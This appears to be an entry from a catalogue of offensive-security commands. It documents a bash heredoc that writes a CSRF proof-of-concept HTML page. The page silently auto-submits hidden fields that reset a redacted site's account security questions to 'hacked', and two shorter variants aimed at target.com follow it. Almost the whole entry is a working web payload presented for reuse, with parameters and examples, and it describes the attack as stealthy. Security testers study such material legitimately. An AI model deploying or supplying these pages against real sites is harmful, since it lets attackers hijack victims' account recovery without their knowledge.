---
id: c2e3f4g5-h6i7-8902-def0-123456789012
data: |-
  cat > csrf_poc.html << EOF
  <html>
   <!-- CSRF PoC -->
   <body>
   <form action="https://www.█████████/member/updatesecurityquestions" method="POST">
   <input type="hidden" name="security_questions1" value="1" />
   <input type="hidden" name="security_question_answer1" value="hacked" />
   <input type="hidden" name="security_questions2" value="2" />
   <input type="hidden" name="security_question_answer2" value="hacked" />
   <input type="hidden" name="security_questions3" value="3" />
   <input type="hidden" name="security_question_answer3" value="hacked" />
   <input type="hidden" name="submit" value="Save" />
   </form>
   <script>document.forms[0].submit();</script>
   </body>
  </html>
  EOF
tags:
  - csrf
  - html
  - poc
type: command
output: File csrf_poc.html created
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.295Z'
verified: false
validated: true
submitted: true
---
# html-csrf-poc

## Command

```bash
cat > csrf_poc.html << EOF
<html>
 <!-- CSRF PoC -->
 <body>
 <form action="https://www.█████████/member/updatesecurityquestions" method="POST">
 <input type="hidden" name="security_questions1" value="1" />
 <input type="hidden" name="security_question_answer1" value="hacked" />
 <input type="hidden" name="security_questions2" value="2" />
 <input type="hidden" name="security_question_answer2" value="hacked" />
 <input type="hidden" name="security_questions3" value="3" />
 <input type="hidden" name="security_question_answer3" value="hacked" />
 <input type="hidden" name="submit" value="Save" />
 </form>
 <script>document.forms[0].submit();</script>
 </body>
</html>
EOF
```

## Description

This bash command creates an HTML file serving as a CSRF proof-of-concept that auto-submits a form to change security questions, using JavaScript for stealthy execution in the victim's browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cat > csrf_poc.html` | Redirects output to file | Yes |
| `<< EOF` | Here-document delimiter | Yes |
| Form inputs | Hidden fields for parameters | Yes |
| `<script>` | Auto-submit JavaScript | Yes |

## Examples

### Basic Usage

```bash
cat > basic_csrf.html << EOF
<html><body><form action="https://target.com/endpoint" method="POST"><input type="hidden" name="param" value="value" /></form><script>document.forms[0].submit();</script></body></html>
EOF
```

### Advanced Usage

```bash
cat > advanced_csrf.html << EOF
<html><body onload="document.forms[0].submit()"><form action="https://target.com/secure" method="POST">... hidden fields ...</form></body></html>
EOF
```

## Expected Output

The command outputs nothing to stdout but creates the 'csrf_poc.html' file. Opening it in a browser will attempt the POST submission if conditions are met.

## Related

- [[Related Procedure: Craft-CSFR-Proof-of-Concept]]
